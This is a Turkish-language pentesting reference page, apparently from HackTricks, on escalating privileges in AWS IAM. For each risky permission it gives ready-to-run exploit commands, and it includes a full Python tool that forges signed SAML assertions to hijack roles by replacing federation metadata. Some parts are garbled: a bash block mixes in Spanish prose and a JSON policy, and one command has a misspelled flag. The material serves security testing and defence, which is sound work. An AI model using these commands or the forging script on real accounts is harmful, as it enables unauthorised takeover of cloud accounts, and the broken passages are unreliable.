# AWS - IAM Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## IAM

IAM hakkında daha fazla bilgi için bakınız:

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

### **`iam:CreatePolicyVersion`**

Yeni bir IAM policy sürümü oluşturma yetkisi verir; `--set-as-default` bayrağını kullanarak `iam:SetDefaultPolicyVersion` izninin gerekliliğini atlayabilirsiniz. Bu, özel izinler tanımlamayı mümkün kılar.

**Exploit Command:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Etkisi:** Herhangi bir kaynaktaki herhangi bir işlemi gerçekleştirmeye izin vererek doğrudan yetki yükseltir.

### **`iam:SetDefaultPolicyVersion`**

Bir IAM politikasının varsayılan sürümünü başka bir mevcut sürüme değiştirmeye izin verir; yeni sürüm daha fazla izin içeriyorsa potansiyel olarak yetki yükseltmesine yol açabilir.

**Bash Komutu:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Etkisi:** Daha fazla izin verilmesine olanak tanıyarak dolaylı ayrıcalık yükseltmesine yol açar.

### **`iam:CreateAccessKey`, (`iam:DeleteAccessKey`)**

Başka bir kullanıcı için erişim anahtarı kimliği ve gizli erişim anahtarı oluşturulmasına izin verir; bu da potansiyel ayrıcalık yükseltmesine yol açar.

**Exploit:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Impact:** Başka bir kullanıcının genişletilmiş izinlerini üstlenerek doğrudan ayrıcalık yükseltme.

Bir kullanıcının yalnızca 2 erişim anahtarı oluşturabileceğini unutmayın; eğer bir kullanıcı zaten 2 erişim anahtarına sahipse, yeni bir tane oluşturabilmek için onlardan birini silmek amacıyla `iam:DeleteAccessKey` iznine ihtiyacınız olacaktır:
```bash
aws iam delete-access-key --uaccess-key-id <key_id>
```
### **`iam:CreateVirtualMFADevice` + `iam:EnableMFADevice`**

Eğer yeni bir sanal MFA cihazı oluşturup bunu başka bir kullanıcı için etkinleştirebiliyorsanız, o kullanıcı adına kendi MFA'nızı fiilen kaydedip ardından onların kimlik bilgileriyle MFA destekli bir oturum talep edebilirsiniz.

**Exploit:**
```bash
# Create a virtual MFA device (this returns the serial and the base32 seed)
aws iam create-virtual-mfa-device --virtual-mfa-device-name <mfa_name>

# Generate 2 consecutive TOTP codes from the seed, then enable it for the user
aws iam enable-mfa-device --user-name <target_user> --serial-number <serial> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Etkisi:** Bir kullanıcının MFA kaydını devralarak doğrudan ayrıcalık yükseltmesi (ve ardından onların izinlerini kullanma).

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

Giriş profili oluşturma veya güncelleme izni verir; AWS konsol giriş şifrelerinin ayarlanması da dahil olmak üzere, bu doğrudan ayrıcalık yükseltmesine yol açar.

**Oluşturma için Exploit:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Güncelleme için Exploit:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Impact:** Herhangi bir kullanıcı olarak giriş yaparak doğrudan ayrıcalık yükseltmesi.

### **`iam:UpdateAccessKey`**

Devre dışı bırakılmış bir access key'i etkinleştirmeye izin verir; eğer saldırgan devre dışı bırakılmış access key'e sahipse yetkisiz erişime yol açabilir.

**Exploit:**
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
**Etkisi:** Erişim anahtarlarını yeniden etkinleştirerek doğrudan ayrıcalık yükseltme.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

Belirli AWS servisleri için (çoğunlukla **CodeCommit**) kimlik bilgileri oluşturmayı veya sıfırlamayı sağlar. Bunlar **değildir** AWS API keys: bunlar belirli bir servis için **kullanıcı adı/parola** kimlik bilgileridir ve yalnızca o servisin kabul ettiği yerlerde kullanabilirsiniz.

**Oluşturma:**
```bash
aws iam create-service-specific-credential --user-name <target_user> --service-name codecommit.amazonaws.com
```
Kaydet:

- `ServiceSpecificCredential.ServiceUserName`
- `ServiceSpecificCredential.ServicePassword`

**Örnek:**
```bash
# Find a repository you can access as the target
aws codecommit list-repositories

export REPO_NAME="<repo_name>"
export AWS_REGION="us-east-1" # adjust if needed

# Git URL (HTTPS)
export CLONE_URL="https://git-codecommit.${AWS_REGION}.amazonaws.com/v1/repos/${REPO_NAME}"

# Clone and use the ServiceUserName/ServicePassword when prompted
git clone "$CLONE_URL"
cd "$REPO_NAME"
```
> Not: Servis parolası genellikle `+`, `/` ve `=` gibi karakterler içerir. Etkileşimli prompt kullanmak genellikle en kolay yoldur. Eğer bunu bir URL'ye gömüyorsanız, önce URL kodlayın.

Bu noktada hedef kullanıcının CodeCommit'te erişebildiği her şeyi okuyabilirsiniz (ör. leaked credentials file). Eğer repodan **AWS access keys** elde ederseniz, bu anahtarlarla yeni bir AWS CLI profile yapılandırın ve sonra kaynaklara erişin (örneğin, Secrets Manager'dan bir flag okuyun):
```bash
aws secretsmanager get-secret-value --secret-id <secret_name> --profile <new_profile>
```
**Sıfırlama:**
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
**Etkisi:** Hedef kullanıcının ilgili servis için izinlerine ayrıcalık yükseltme (ve eğer bu servisten elde edilen verilerle pivot yaparsanız potansiyel olarak daha fazlası).

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Kullanıcılara veya gruplara politika eklemeye izin verir; eklenen politikanın izinlerini devralarak doğrudan ayrıcalık yükseltir.

**Exploit for User:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Grup için Exploit:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Impact:** Politikanın verdiği herhangi bir şeye doğrudan privilege escalation.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

Rollere, kullanıcılara veya gruplara politika iliştirme veya ekleme izni verir; ek izinler vererek doğrudan privilege escalation'e olanak tanır.

**Exploit for Role:**
```bash
aws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Exploit için Inline Policies:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
Aşağıdaki gibi bir politika kullanabilirsiniz:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}
```
**Etkisi:** Politikalar aracılığıyla izin ekleyerek doğrudan ayrıcalık yükseltme.

### **`iam:AddUserToGroup`**

Kendini bir IAM grubuna eklemeyi mümkün kılar; grubun izinlerini devralarak ayrıcalıkları yükseltir.

**Exploit:**
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
**Etkisi:** Doğrudan grubun izin seviyesine kadar ayrıcalık yükseltmesi.

### **`iam:UpdateAssumeRolePolicy`**

Bir rolün assume role policy document'ını değiştirmeye izin verir; bu, rolün üstlenilmesine ve rolün ilişkili izinlerinin kullanılmasına olanak tanır.

**Exploit:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Politika aşağıdaki gibi olduğunda, bu kullanıcıya assume the role izni verir:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Etkisi:** Herhangi bir rolün izinlerini üstlenerek doğrudan ayrıcalık yükseltme.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

CodeCommit'e kimlik doğrulamak için SSH genel anahtarı yüklemeye ve MFA cihazlarını devre dışı bırakmaya izin verir; bu da potansiyel olarak dolaylı ayrıcalık yükselmesine yol açabilir.

**Exploit for SSH Key Upload:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**MFA Devre Dışı Bırakma için Exploit:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Etkisi:** CodeCommit erişimini etkinleştirerek veya MFA korumasını devre dışı bırakarak dolaylı ayrıcalık yükselmesi.

### **`iam:ResyncMFADevice`**

Bir MFA cihazının yeniden senkronizasyonuna izin verir; MFA korumasını manipüle ederek dolaylı ayrıcalık yükselmesine yol açabilir.

**Bash Komutu:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Impact:** Dolaylı ayrıcalık yükseltme — MFA cihazlarını ekleyerek veya manipüle ederek.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Bu izinlerle **SAML bağlantısının XML metadata'sını değiştirebilirsiniz**. Sonra, **SAML federation**'ı suistimal ederek **ona güvenen herhangi bir role** **login** olabilirsiniz.

Dikkat: bunu yaptığınızda **legit users won't be able to login**. Ancak XML'i elde edebilirsiniz; kendi XML'inizi koyup **login** olarak önceki durumu geri yapılandırabilirsiniz.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
**Uçtan uca saldırı:**

1. SAML provider'ını ve ona güvenen bir role'ü listeleyin:
```bash
export AWS_REGION=${AWS_REGION:-us-east-1}

aws iam list-saml-providers
export PROVIDER_ARN="arn:aws:iam::<ACCOUNT_ID>:saml-provider/<PROVIDER_NAME>"

# Backup current metadata so you can restore it later:
aws iam get-saml-provider --saml-provider-arn "$PROVIDER_ARN" > /tmp/saml-provider-backup.json

# Find candidate roles and inspect their trust policy to confirm they allow sts:AssumeRoleWithSAML:
aws iam list-roles | grep -i saml || true
aws iam get-role --role-name "<ROLE_NAME>"
export ROLE_ARN="arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME>"
```
2. IdP metadata + role/provider çiftine yönelik imzalı bir SAML assertion oluştur:
```bash
python3 -m venv /tmp/saml-federation-venv
source /tmp/saml-federation-venv/bin/activate
pip install lxml signxml

# Create /tmp/saml_forge.py from the expandable below first:
python3 /tmp/saml_forge.py --role-arn "$ROLE_ARN" --principal-arn "$PROVIDER_ARN" > /tmp/saml-forge.json
python3 - <<'PY'
import json
j=json.load(open("/tmp/saml-forge.json","r"))
open("/tmp/saml-metadata.xml","w").write(j["metadata_xml"])
open("/tmp/saml-assertion.b64","w").write(j["assertion_b64"])
print("Wrote /tmp/saml-metadata.xml and /tmp/saml-assertion.b64")
PY
```
<details>
<summary>Açılabilir: <code>/tmp/saml_forge.py</code> yardımcı (metadata + imzalı assertion)</summary>
```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import datetime as dt
import json
import os
import subprocess
import tempfile
import uuid

from lxml import etree
from signxml import XMLSigner, methods


def _run(cmd: list[str]) -> str:
p = subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
return p.stdout


def _openssl_make_key_and_cert(tmpdir: str) -> tuple[str, str]:
key_path = os.path.join(tmpdir, "key.pem")
cert_path = os.path.join(tmpdir, "cert.pem")
_run(
[
"openssl",
"req",
"-x509",
"-newkey",
"rsa:2048",
"-keyout",
key_path,
"-out",
cert_path,
"-days",
"3650",
"-nodes",
"-subj",
"/CN=attacker-idp",
]
)
return key_path, cert_path


def _pem_cert_to_b64(cert_pem: str) -> str:
lines: list[str] = []
for line in cert_pem.splitlines():
if "BEGIN CERTIFICATE" in line or "END CERTIFICATE" in line:
continue
line = line.strip()
if line:
lines.append(line)
return "".join(lines)


def make_metadata_xml(cert_b64: str) -> str:
return f"""<?xml version="1.0"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://attacker.invalid/idp">
<IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
<KeyDescriptor use="signing">
<KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
<X509Data>
<X509Certificate>{cert_b64}</X509Certificate>
</X509Data>
</KeyInfo>
</KeyDescriptor>
<SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://attacker.invalid/sso"/>
</IDPSSODescriptor>
</EntityDescriptor>
"""


def make_signed_saml_response(role_arn: str, principal_arn: str, key_pem: str, cert_pem: str) -> bytes:
ns = {
"saml2p": "urn:oasis:names:tc:SAML:2.0:protocol",
"saml2": "urn:oasis:names:tc:SAML:2.0:assertion",
}

issue_instant = dt.datetime.now(dt.timezone.utc)
not_before = issue_instant - dt.timedelta(minutes=2)
not_on_or_after = issue_instant + dt.timedelta(minutes=10)

resp_id = "_" + str(uuid.uuid4())
assertion_id = "_" + str(uuid.uuid4())

response = etree.Element(etree.QName(ns["saml2p"], "Response"), nsmap=ns)
response.set("ID", resp_id)
response.set("Version", "2.0")
response.set("IssueInstant", issue_instant.isoformat())
response.set("Destination", "https://signin.aws.amazon.com/saml")

issuer = etree.SubElement(response, etree.QName(ns["saml2"], "Issuer"))
issuer.text = "https://attacker.invalid/idp"

status = etree.SubElement(response, etree.QName(ns["saml2p"], "Status"))
status_code = etree.SubElement(status, etree.QName(ns["saml2p"], "StatusCode"))
status_code.set("Value", "urn:oasis:names:tc:SAML:2.0:status:Success")

assertion = etree.SubElement(response, etree.QName(ns["saml2"], "Assertion"))
assertion.set("ID", assertion_id)
assertion.set("Version", "2.0")
assertion.set("IssueInstant", issue_instant.isoformat())

a_issuer = etree.SubElement(assertion, etree.QName(ns["saml2"], "Issuer"))
a_issuer.text = "https://attacker.invalid/idp"

subject = etree.SubElement(assertion, etree.QName(ns["saml2"], "Subject"))
name_id = etree.SubElement(subject, etree.QName(ns["saml2"], "NameID"))
name_id.set("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified")
name_id.text = "attacker"

subject_conf = etree.SubElement(subject, etree.QName(ns["saml2"], "SubjectConfirmation"))
subject_conf.set("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
subject_conf_data = etree.SubElement(subject_conf, etree.QName(ns["saml2"], "SubjectConfirmationData"))
subject_conf_data.set("NotOnOrAfter", not_on_or_after.isoformat())
subject_conf_data.set("Recipient", "https://signin.aws.amazon.com/saml")

conditions = etree.SubElement(assertion, etree.QName(ns["saml2"], "Conditions"))
conditions.set("NotBefore", not_before.isoformat())
conditions.set("NotOnOrAfter", not_on_or_after.isoformat())

audience_restriction = etree.SubElement(conditions, etree.QName(ns["saml2"], "AudienceRestriction"))
audience = etree.SubElement(audience_restriction, etree.QName(ns["saml2"], "Audience"))
audience.text = "https://signin.aws.amazon.com/saml"

attr_stmt = etree.SubElement(assertion, etree.QName(ns["saml2"], "AttributeStatement"))

attr_role = etree.SubElement(attr_stmt, etree.QName(ns["saml2"], "Attribute"))
attr_role.set("Name", "https://aws.amazon.com/SAML/Attributes/Role")
attr_role_value = etree.SubElement(attr_role, etree.QName(ns["saml2"], "AttributeValue"))
attr_role_value.text = f"{role_arn},{principal_arn}"

attr_session = etree.SubElement(attr_stmt, etree.QName(ns["saml2"], "Attribute"))
attr_session.set("Name", "https://aws.amazon.com/SAML/Attributes/RoleSessionName")
attr_session_value = etree.SubElement(attr_session, etree.QName(ns["saml2"], "AttributeValue"))
attr_session_value.text = "saml-session"

key_bytes = open(key_pem, "rb").read()
cert_bytes = open(cert_pem, "rb").read()

signer = XMLSigner(
method=methods.enveloped,
signature_algorithm="rsa-sha256",
digest_algorithm="sha256",
c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#",
)
signed_assertion = signer.sign(
assertion,
key=key_bytes,
cert=cert_bytes,
reference_uri=f"#{assertion_id}",
id_attribute="ID",
)

response.remove(assertion)
response.append(signed_assertion)

return etree.tostring(response, xml_declaration=True, encoding="utf-8")


def main() -> None:
ap = argparse.ArgumentParser()
ap.add_argument("--role-arn", required=True)
ap.add_argument("--principal-arn", required=True)
args = ap.parse_args()

with tempfile.TemporaryDirectory() as tmp:
key_path, cert_path = _openssl_make_key_and_cert(tmp)
cert_pem = open(cert_path, "r", encoding="utf-8").read()
cert_b64 = _pem_cert_to_b64(cert_pem)

metadata_xml = make_metadata_xml(cert_b64)
saml_xml = make_signed_saml_response(args.role_arn, args.principal_arn, key_path, cert_path)
saml_b64 = base64.b64encode(saml_xml).decode("ascii")

print(json.dumps({"metadata_xml": metadata_xml, "assertion_b64": saml_b64}))


if __name__ == "__main__":
main()
```
</details>

3. SAML provider metadata'yi IdP sertifikanıza güncelleyin, rolü üstlenin ve döndürülen STS kimlik bilgilerini kullanın:
```bash
aws iam update-saml-provider --saml-provider-arn "$PROVIDER_ARN" \
--saml-metadata-document file:///tmp/saml-metadata.xml

# Assertion is base64 and can be long. Keep it on one line:
ASSERTION_B64=$(tr -d '\n' </tmp/saml-assertion.b64)
SESSION_LINE=$(aws sts assume-role-with-saml --role-arn "$ROLE_ARN" --principal-arn "$PROVIDER_ARN" --saml-assertion "$ASSERTION_B64" \
--query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken,Expiration]' --output text)
IFS=$'\t' read -r SESSION_AK SESSION_SK SESSION_ST SESSION_EXP <<<"$SESSION_LINE"
echo "Session expires at: $SESSION_EXP"

# Use creds inline (no need to create an AWS CLI profile):
AWS_ACCESS_KEY_ID="$SESSION_AK" AWS_SECRET_ACCESS_KEY="$SESSION_SK" AWS_SESSION_TOKEN="$SESSION_ST" AWS_REGION="$AWS_REGION" \
aws sts get-caller-identity
```
4. Temizlik: önceki meta verilerini geri yükle:
```bash
python3 - <<'PY'
import json
j=json.load(open("/tmp/saml-provider-backup.json","r"))
open("/tmp/saml-metadata-original.xml","w").write(j["SAMLMetadataDocument"])
PY
aws iam update-saml-provider --saml-provider-arn "$PROVIDER_ARN" \
--saml-metadata-document file:///tmp/saml-metadata-original.xml
```
> [!WARNING]
> SAML provider metadata güncellemesi kesintiye neden olur: metadata yerinde olduğu sürece meşru SSO kullanıcıları kimlik doğrulaması yapamayabilir.

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Bundan emin değilim) Eğer bir saldırganın bu **izinlere** sahip olması durumunda, sağlayıcıya güvenen tüm rollere giriş yapabilmek için yeni bir **Thumbprint** ekleyebilir.
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
### `iam:PutUserPermissionsBoundary`

Bu permission, bir attacker'ın bir kullanıcının permissions boundary'sini güncellemesine izin verir; bu, mevcut izinleriyle normalde kısıtlı olan eylemleri gerçekleştirmesine izin vererek privileges'larının escalating olmasına neden olabilir.
```bash
aws iam put-user-permissions-boundary \
--user-name <nombre_usuario> \
--permissions-boundary arn:aws:iam::<cuenta>:policy/<nombre_politica>

Un ejemplo de una política que no aplica ninguna restricción es:


{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "BoundaryAllowAll",
"Effect": "Allow",
"Action": "*",
"Resource": "*"
}
]
}
```
### `iam:PutRolePermissionsBoundary`

`iam:PutRolePermissionsBoundary` iznine sahip bir aktör mevcut bir role bir permissions boundary (izin sınırı) atayabilir. Risk, bu izne sahip birinin bir rolün sınırını değiştirdiğinde ortaya çıkar: işlemleri uygunsuz şekilde kısıtlayarak hizmet kesintisine neden olabilirler veya daha izin verici bir sınır eklerlerse rolün yapabileceklerini fiilen genişleterek ayrıcalıkları yükseltebilirler.
```bash
aws iam put-role-permissions-boundary \
--role-name <Role_Name> \
--permissions-boundary arn:aws:iam::111122223333:policy/BoundaryPolicy
```
## Referanslar

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{{#include ../../../../banners/hacktricks-training.md}}
